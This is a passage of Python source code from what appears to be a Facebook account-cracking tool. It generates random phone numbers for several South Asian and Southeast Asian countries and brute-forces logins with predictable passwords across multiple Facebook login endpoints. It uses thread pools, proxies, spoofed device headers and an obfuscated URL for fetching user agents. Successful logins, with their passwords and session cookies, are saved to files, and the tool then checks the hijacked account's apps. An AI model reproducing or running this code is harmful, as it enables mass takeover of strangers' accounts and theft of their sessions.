                    with open('/sdcard/RANDOM-T.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in tst['error']['message']:
                    print(f"\r\r {R}[CP] {ids} | {pas}")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.mtdB(ids,names,passlist,tl)
        except Exception as e:
            pass

    def mtdC(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M3|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                ua = tanim()
                data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "en_US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                po = self.session.post("https://graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[OK] {ids} | {pas}")
                    with open('/sdcard/RANDOM-T.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in tst['error']['message']:
                    print(f"\r\r {R}[CP] {ids} | {pas}")
                    with open('/sdcard/CP.txt', 'a') as f:
                        f.write(ids + '|' + pas +'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.mtdC(ids,names,passlist,tl)
        except Exception as e:
            pass

    def rnd(self):
        self.clear()
        print(f" [1] Random Bangladesh \n [2] Random Malaysia \n [3] Random India \n [4] Random Nepal")
        self.linex()
        country = input(f" {X} Select > ")
        self.clear()
        if country == "1":
            print(f" {X} Ex > 0171, 0192, 0160")
        elif country == "2":
            print(f" {X} Ex > 0118, 012*, 011*")
        elif country == "3":
            print(f" {X} Ex > 9848,98**, 63**")
        elif country == "4":
            print(f" {X} Ex > 9814, 99**, 98**")
        else:
            print(f" {X} Select Correct Country :)");time.sleep(2)
        self.linex()
        code = input(f" {X} Put Code > ")
        self.linex()
        print(f" {X} Ex > 1000,9999")
        self.linex()
        try:limit = int(input(f" {X} Put Limit > "))
        except:limit = 99999
        for nmbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            self.user.append(nmp)
        self.linex()
        print(f" [1] Auto Password \n [2] Manual Password")
        self.linex()
        pstype = input(f" {X} Select > ")
        if pstype == "1":
            if country == "1":
                for pasx in ["last11"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "2":
                for pasx in ["first6","first7","first8","last11","last6","last7","last8","Malaysia","malaysia"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "3":
                for pasx in ["first10","first6","first8","first7","last6","last8","57273200","59039200","57575711"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "4":
                for pasx in ['last7','last6','last8','first10','nepal123','maya123','nepal1234','tamang','magar123','nepal12345','magar1234','magar12345','nepali','tamang123','kathmandu','pokhara','kathmandu123','pokhara123','dinesh','gurung123','sagar123','Kathmandu1234']:
                    self.plist.append(pasx)
                self.linex()
        else:
            self.linex()
            try:pslimit = int(input(f" {X} Password Limit? > "))
            except:pslimit = 8
            self.linex()
            print(f" {X} Ex > first6,last6,first7,etc...")
            self.linex()
            for x in range(pslimit):
                pwx = input(f" {X} Password [{x+1}] > ")
                self.plist.append(pwx)
        self.clear()
        print(f" [1] Method [c_user] \n [2] Method [c_user] \n [3] Method [c_user] \n [4] Method [c_user] \n [5] Method [c_user]")
        self.linex()
        mtd = input(f" {X} Select > ")
        self.linex()
        print(f" [1] Cracking Speed [Normal] \n [2] Cracking Speed [High]")
        self.linex()
        spd = input(f" {X} Select > ")
        if spd == "1":speed = 30
        else:speed = 45
        self.linex()
        print(f" {X} Do You Want to Show Cookie ?)")
        self.linex()
        cki = input(f" {X} Select (Y|N) > ")
        if cki in ["n","N","no","NO"]:self.cok.append("no")
        else:self.cok.append("yes")
        with ThreadPoolExecutor(max_workers=speed) as executor:
            self.clear()
            print(f" {X} Operator  > {code} \n {X} Total Account > {G}{limit}\n {X} Use Airplane ({R}Flight{W}) Mode For Speed Up")
            self.linex()
            for love in self.user:
                ids = code+love
                if mtd == "1":
                    executor.submit(self.rA, ids)
                elif mtd == "2":
                    executor.submit(self.rB, ids)
                elif mtd == "4":
                    executor.submit(self.rD, ids)
                elif mtd == "5":
                    executor.submit(self.rE, ids)
                else:
                    executor.submit(self.rC, ids)
        print("")
        self.linex()
        print(f" {X} Total Ok Account >{G} {len(self.oks)}\n {X} Total Cp Account >{R} {len(self.cps)}")
        self.linex()
        print(f" {X} The Process Has Completed \n {X} Thanks For Using My Tools")
        self.linex()
        sys.exit()

    def pwmanager(self,num,type):
        if 'first' in type:
            try:
                code = type.split('t')[1]
                password = num[:int(code)]
            except:
                password = num
        elif 'last' in type:
            try:
                code = type.split('t')[1]
                password = num[-int(code):]
            except:
                password = num
        else:
            password = type
        return password

    def check_lock(self,uid):
        req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
        if 'Photoshop' in req:
            return True
        else:
            return False

    def generate_jazoest(self,sex):
        jazoest_sum = 0
        for char in sex:
            jazoest_sum += ord(char)
        return f'2{jazoest_sum}'

    def rA(self,ids):
        sys.stdout.write(f"\r {W}[SEARCHING]-[{self.loop}] M1|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids,pw)
                    machine_id = str(uuid.uuid4())
                    jazoest = self.generate_jazoest(machine_id)
                    ua = tanim()
                    data={
                    'email': ids,
                    'password': pas,
                    'adid': str(uuid.uuid4()),
                    'device_id': str(uuid.uuid4()),
                    'family_device_id': str(uuid.uuid4()),
                    'advertiser_id': str(uuid.uuid4()),
                    'machine_id': str(uuid.uuid4()),
                    'locale': 'bn_BD',
                    'country_code': 'IN',
                    'client_country_code': 'BM',
                    'cpl': 'true',
                    'source': 'login',
                    'format': 'json',
                    'credentials_type': 'password',
                    'error_detail_type': 'button_with_disabled',
                    'generate_session_cookies': '1',
                    'generate_analytics_claim': '1',
                    'generate_machine_id': '1',
                    'meta_inf_fbmeta': 'NO_FILE',
                    'currently_logged_in_userid': '0',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                    'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'api_key': '882a8490361da98702bf97a021ddc14d',
                    'sig': '62f8ce9f74b12f84c123cc23437a4a32',
                    'method': 'auth.login',
                    'logged_out_id': str(uuid.uuid4()),
                    'interface': 'wifi',
                    'reason': 'unknown',
                    'headwind_version': '3',
                    'headwind_cursor': '{}',
                    'community_id': '',
                    'try_num': '1',
                    'enroll_misauth': 'false',
                    'jazoest': jazoest,
                    'sim_country': 'BD',
                    'network_country': 'BD',
                    'flow': 'CONTROLLER_INITIALIZATION'}
                    header={
                    'User-Agent': user_agent(),
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-Tigon-Is-Retry': 'False',
                    'X-FB-Friendly-Name': 'authenticate',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'fb_api_caller_class': 'graphservice',
                    'Priority': 'u=3, i',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True'}
                    url = 'https://b-graph.facebook.com/auth/login'
                    po = session.post(url,data=data,headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid=str(q['uid'])
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[NV] {uid} | {pas} ")
                            else:
                                print(f"\r\r {G}[OK] {uid} | {pas} \n =[]=COOKIES{G} {coki}")
                            open("/sdcard/RANDOM-TRUE.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            print(f"\r\r {G}[OK] {uid} | {pas} \n =[]=COOKIES{G} {coki}")
                            open("/sdcard/TAHSAN-FALSE.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        print('\r\r\\033[38;5;196m[XIBO-CP] '+ids+' | '+pas)
                        open("/sdcard/TAHSAN-M1-Cp.txt","a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rA(ids)
        except Exception as e:
            print(e)

    def rB(self,ids):
        sys.stdout.write(f"\r {W}[SEARCHING]-[{self.loop}] M2|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids,pw)
                    ua = tanim()
                    data={
                    "email": ids,
                    "password": pas,
                    "adid": str(uuid.uuid4()),
                    "device_id": str(uuid.uuid4()),
                    "family_device_id": str(uuid.uuid4()),
                    "session_id": str(uuid.uuid4()),
                    "advertiser_id": str(uuid.uuid4()),
                    "reg_instance": str(uuid.uuid4()),
                    "logged_out_id": str(uuid.uuid4()),
                    "locale": "en_US",
                    "client_country_code": "US",
                    "cpl": "true",
                    "source": "login",
                    "format": "json",
                    "omit_response_on_success": "false",
                    "credentials_type": "password",
                    "error_detail_type": "button_with_disabled",
                    "generate_session_cookies": "1",
                    "generate_analytics_claim": "1",
                    "generate_machine_id": "1",
                    "tier": "regular",
                    "currently_logged_in_userid": "0",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
                    "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "api_key": "882a8490361da98702bf97a021ddc14d",
                    "sig": "62f8ce9f74b12f84c123cc23437a4a32"
                    }
                    header={
                    "User-Agent": sexua(),
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Bandwidth": str(random.randint(2000000, 30000000)),
                    "X-FB-Connection-Quality": "EXCELLENT",
                    "X-FB-Connection-Type": "MOBILE.LTE",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Friendly-Name": "authenticate",
                    "Content-Type": "application/x-www-form-urlencoded"
                    }
                    url = "https://graph.facebook.com/auth/login"
                    po = session.post(url,data=data,headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid=str(q['uid'])
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[SUCCESS] {uid} | {pas} ")
                            else:
                                print(f"\r\r {G}[OK] {uid} {R} ● {G}{pas} \n {G}[🐸]{R} ● {G} {coki}")
                            open("/sdcard/RANDOM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            print(f"\r\r {G}[OK] {uid} {R} ● {G}{pas} \n {G}[🐸]{R} ● {G} {coki}")
                            open("/sdcard/TAHSAN-LOCK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        print('\r\r\033[38;5;46m[CP] '+ids+' | '+pas)
                        open("/sdcard/1Pass-CP.txt","a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rB(ids)
        except Exception as e:
            pass

    def rC(self,ids):
        sys.stdout.write(f"\r {W}[SEARCHING]-[{self.loop}] M3|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids,pw)
                    ua = user_agent()
                    data={
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'fb_api_req_friendly_name': 'authenticate'}
                    header={
                    'User-Agent':ua,
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}
                    url = "https://api.facebook.com/method/auth.login"
                    po = session.post(url,data=data,headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid=str(q['uid'])
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[OK] {uid} | {pas} ")
                            else:
                                print(f"\r\r {G}[OK] {uid} | {pas} \n {W}->>{G} {coki}")
                            open("/sdcard/RANDOM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            #print(f"\r\r {Y}[LOCK] {uid} | {pas} ")
                            open("/sdcard/TAHSAN-LOCK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif 'www.facebook.com' in q['error_msg']:
                        open("/sdcard/RANDOM-CP.txt","a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rC(ids)
        except Exception as e:
            pass

    def cek_apk(self,session,coki):
        try:
            w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
            sop = BeautifulSoup(w,"html.parser")
            x = sop.find("form",method="post")
            game = [i.text for i in x.find_all("h3")]
            if len(game)==0:
                print(f'\r {W}[/] {R}SORRY THERE IS NO ACTIVE APK')
            else:
                print(f'\r {W}[/] {G}YOUR ACTIVE APPLICATION DETAILS')
                for i in range(len(game)):
                    print(f"\r%s [%s] %s %s "%(G,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),W))
            w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
            sop = BeautifulSoup(w,"html.parser")
            x = sop.find("form",method="post")
            game = [i.text for i in x.find_all("h3")]
            if len(game)==0:
                print(f'\r {W}[/] {R}SORRY THERE IS NO EXPIRED APK{W}')
            else:
                print(f'\r {W}[/] {B}YOUR EXPIRED APPLICATION DETAILS')
                for i in range(len(game)):
                    print(f"\r%s [%s] %s %s "%(B,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),W))
        except Exception as e:pass

    def rD(self,ids):
        sys.stdout.write(f"\r {W}[SEARCHING]-[{self.loop}] M4|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as ses:
                    pas = self.pwmanager(ids,pw)
                    usera = requests.get('https'+':'+'//'+'gist'+'.'+'github'+'user'+'content'+'.'+'com'+'/'+'pzb'+'/'+'b4b6f57'+'144aea'+'7827ae4'+'/'+'raw'+'/'+'cf847b76a142955b1'+'410c8b'+'c'+'e'+'f'+'3'+'aabe221a63db1'+'/'+'user'+'-'+'agents'+'.'+'txt').text.splitlines()
                    ua = random.choice(usera)
                    nip=random.choice(proxsi)
                    proxs= {'http': 'socks4://'+nip}
                    p = ses.get("https://m.facebook.com/login.php/")
                    m_ts_match = re.search('name="m_ts" value="(.*?)"', p.text)
                    m_ts = m_ts_match.group(1)
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                    __data__ ={'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),'display': '','isprivate': '','return_session': '','skip_api_login': '','signed_next': '','trynum': '1','timezone': '-360','lgndim': 'eyJ3Ijo0MzIsImgiOjk2MCwiYXciOjQzMiwiYWgiOjk2MCwiYyI6MjR9','lgnrnd': '231654_hyP4','lgnjs': '1718518614','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','ab_test_data': '%2FAAAAAAAAAAAAAAAAAAVAAAAAAAAAAVVAAAAAVAAA%2F%2FAA%2FAAAADAAB','encpass': f"#PWD_BROWSER:0:{m_ts}:{pas}"}
                    __head__ = {'user-agent': ua,'Accept-Encoding': 'gzip, deflate','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Connection': 'keep-alive','authority': 'en-gb.facebook.com','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://en-gb.facebook.com','referer': 'https://en-gb.facebook.com/login.php/','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','Content-Length': '507'}
                    po = ses.post('https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=__data__,cookies={'cookie': kuki},headers=__head__,allow_redirects=False,proxies=proxs)
                    if "c_user" in ses.cookies.get_dict().keys():
                        coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                        uid = re.findall('c_user=(.*);xs', coki)[0]
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[OK] {uid} | {pas} ")
                                self.cek_apk(ses,coki)
                            else:
                                print(f"\r\r {G}[SUCCESS] {uid} | {pas} \n {G}COOKIES->>{G} {coki}")
                                self.cek_apk(ses,coki)
                            open("/sdcard/RANDOM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            print(f"\r\r {R}[DEAD] {uid} | {pas} ")
                            #open("/sdcard/TAHSAN-LOCK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif "checkpoint" in po.cookies.get_dict().keys():
                        open("/sdcard/M4-CP.txt","a").write(num+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rD(ids)
        except Exception as e:
            pass

    def rE(self,ids):
        sys.stdout.write(f"\r {W}[SEARCHING]-[{self.loop}] M5|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids,pw)
                    ua = tanim()
                    data={
                    "adid": str(uuid.uuid4()).upper(),
                    "device_id": str(uuid.uuid4()).upper(),
                    "family_device_id": str(uuid.uuid4()).upper(),
                    "secure_family_device_id": str(uuid.uuid4()).upper(),
                    "logged_out_id": str(uuid.uuid4()),
                    "hash_id": str(uuid.uuid4()),
                    "reg_instance": str(uuid.uuid4()),
                    "session_id": str(uuid.uuid4()),
                    "advertiser_id": str(uuid.uuid4()),
                    "format": "json",
                    "email": ids,
                    "password": pas,
                    "generate_analytics_claims": "1",
                    "credentials_type": "password",
                    "source": "login",
                    "sim_country": "id",
                    "network_country": "id",
                    "relative_url": "method/auth.login",
                    "error_detail_type": "button_with_disabled",
                    "enroll_misauth": "false",
                    "generate_session_cookies": "1",
                    "generate_machine_id": "1",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
                    }
                    header={
                    "Host": "b-graph.facebook.com",
                    "User-Agent": tanim(),
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "X-FB-Connection-Type": "unknown",
                    "X-FB-Connection-Bandwidth": str(random.randint(20000000, 50000000)),
                    "X-FB-Net-HNI": str(random.randint(30000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(30000, 40000)),
                    "X-FB-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "X-FB-device-group": str(random.randint(3500, 3600)),
                    "X-FB-Friendly-Name": "authenticate",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-connection-quality": "EXCELLENT",
                    "X-Tigon-Is-Retry": "False",
                    "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "X-FB-HTTP-Engine": "Liger"
                    }
                    url = "https://b-graph.facebook.com/auth/login"
                    po = session.post(url,data=data,headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid=str(q['uid'])
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[OK] {uid} | {pas} ")
                            else:
                                print(f"\r\r {G}[OK] {uid} | {pas} \n {W}->>{G} {coki}")
                            open("/sdcard/RANDOM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            #print(f"\r\r {Y}[LOCK] {uid} | {pas} ")
                            open("/sdcard/TAHSAN-RND-LOCK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        print('\r\r\033[38;5;196m[DEAD] '+ids+' | '+pas)
                        open("/sdcard/TAHSAN-M5-Cp.txt","a").write(uid+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rE(ids)
        except Exception as e:
            pass

RANDOM()